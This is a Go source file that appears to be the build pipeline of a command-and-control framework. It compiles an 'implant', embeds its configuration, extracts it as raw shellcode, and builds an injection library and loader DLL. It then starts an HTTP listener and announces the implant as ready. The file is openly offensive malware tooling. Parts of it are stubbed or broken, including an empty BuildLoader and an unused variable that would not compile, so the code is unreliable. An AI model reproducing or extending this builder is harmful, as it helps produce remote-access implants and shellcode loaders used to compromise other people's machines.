package core

import (
	"fmt"
	"os"
	"path"
	"path/filepath"
	"time"
)

var (
	LinkerLoader = LoaderPath + "/linker.loader.ld"
	HashStrings  = ConfigsPath + "/strings.txt"
	DllMain      = LoaderPath + "/dllmain.cpp"
	RsrcScript   = LoaderPath + "/resource.rc"
	HashHeader   = CorelibInc + "/names.hpp"
)

func (h *HexaneConfig) BuildLoader(cfgName string) error {
	return nil
}

func (h *HexaneConfig) BuildModule(modCfg *Object) error {
	var (
		err error
	)

	/*
		sources should be compiled together as one
		pre-builds should be compiled separately with their own sources and returned an object
		the object should be added to modCfg.Components
		all builds can be objects
	*/

	return h.ExecuteBuild(modCfg)
}

func (h *HexaneConfig) RunBuild() error {
	var (
		err error
		cfg *Object
	)

	WrapMessage("DBG", "creating payload directory")
	if err = os.MkdirAll(h.CompilerCFG.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("DBG", "generating config")
	if err = h.GenerateConfigBytes(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating hashes")
	if err = GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	if err = SearchFile(filepath.Join(Corelib, "build"), "corelib.a"); err != nil {
		if err.Error() == FileNotFound.Error() {

			WrapMessage("DBG", "generating corelib\n")
			if cfg, err = GetModuleConfig(path.Join(Corelib, "corelib.json")); err != nil {
				return err
			}
			if err = h.BuildModule(cfg); err != nil {
				return err
			}
		} else {
			return err
		}
	}

	WrapMessage("DBG", "generating implant\n")
	if cfg, err = GetModuleConfig(path.Join(ImplantPath, "implant.json")); err != nil {
		return err
	}
	if err = h.BuildModule(cfg); err != nil {
		return err
	}

	WrapMessage("DBG", "embedding implant config data")
	if err = h.EmbedSectionData(path.Join(ImplantPath, "build")+"/implant.exe", ".text$F", h.ConfigBytes); err != nil {
		return err
	}

	WrapMessage("DBG", "extracting shellcode")
	if err = h.CopySectionData(path.Join(ImplantPath, "build")+"/implant.exe", path.Join(h.CompilerCFG.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	if h.ImplantCFG.Injection != nil {

		WrapMessage("DBG", "generating injectlib\n")
		if err = h.BuildModule(h.ImplantCFG.Injection.Object); err != nil {
			return err
		}

		WrapMessage("DBG", "embedding injectlib config")
		if err = h.EmbedSectionData(path.Join(h.CompilerCFG.BuildDirectory, h.ImplantCFG.Injection.Object.OutputName), ".text$F", h.ConfigBytes); err != nil {
			return err
		}

		WrapMessage("DBG", "generating loader dll")
		if err = h.BuildLoader(path.Join(LoaderPath, "loader.json")); err != nil {
			return err
		}
	}

	AddConfig(h)
	go h.HttpServerHandler()

	time.Sleep(time.Millisecond * 500)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
